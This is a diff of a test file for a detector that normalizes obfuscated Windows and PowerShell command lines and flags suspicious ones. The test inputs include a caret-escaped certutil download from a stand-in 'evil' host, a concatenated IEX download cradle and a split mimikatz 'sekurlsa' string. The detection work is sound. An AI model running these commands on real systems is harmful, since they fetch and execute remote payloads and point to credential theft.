@@ -127,13 +127,11 @@ describe("normalizeCommand — leaves legitimate commands alone", () => {
 
   // A doubled quote INSIDE a string is an escaped literal quote, not a token split.
   it("reads a doubled quote inside a string as one literal quote", () => {
-    expect(normalizeCommand('Write-Output "se""kurlsa"', "powershell").text).toBe(
-      'Write-Output "se"kurlsa"',
-    );
+    expect(normalizeCommand('Write-Output "se""kurlsa"', "powershell").text).toBe('Write-Output "se"kurlsa"');
   });
 
   it("does not resolve concatenation written inside a single-quoted literal", () => {
-    const raw = "Write-Output '\"IE\"+\"X\"'";
+    const raw = 'Write-Output \'"IE"+"X"\'';
     expect(normalizeCommand(raw, "powershell").text).toBe(raw);
   });
 
@@ -178,9 +176,7 @@ describe("wired into the command matchers", () => {
   });
 
   it("recognises a caret-escaped certutil download", () => {
-    expect(reconTechniques("cmd.exe", "c^e^r^t^u^t^i^l -urlcache -f http://evil/x.exe")).toContain(
-      "T1105",
-    );
+    expect(reconTechniques("cmd.exe", "c^e^r^t^u^t^i^l -urlcache -f http://evil/x.exe")).toContain("T1105");
   });
 
   it("grades a backtick-escaped encoded PowerShell command", () => {
@@ -193,10 +189,7 @@ describe("wired into the command matchers", () => {
 
   it("recognises a concatenated IEX download cradle", () => {
     expect(
-      isSuspiciousCmd(
-        "powershell.exe",
-        "'IE'+'X' (New-Object Net.WebClient).DownloadString('http://x')",
-      ),
+      isSuspiciousCmd("powershell.exe", "'IE'+'X' (New-Object Net.WebClient).DownloadString('http://x')"),
     ).toBe("weak");
   });
 
@@ -230,7 +223,7 @@ describe("regressions — strings that must never grade as an attack", () => {
   });
 
   it("does not resolve concatenation inside a single-quoted literal", () => {
-    expect(isSuspiciousCmd("powershell.exe", "Write-Output '\"IE\"+\"X\"'")).toBeNull();
+    expect(isSuspiciousCmd("powershell.exe", 'Write-Output \'"IE"+"X"\'')).toBeNull();
   });
 
   it("does not apply cmd caret rules to a PowerShell command line", () => {
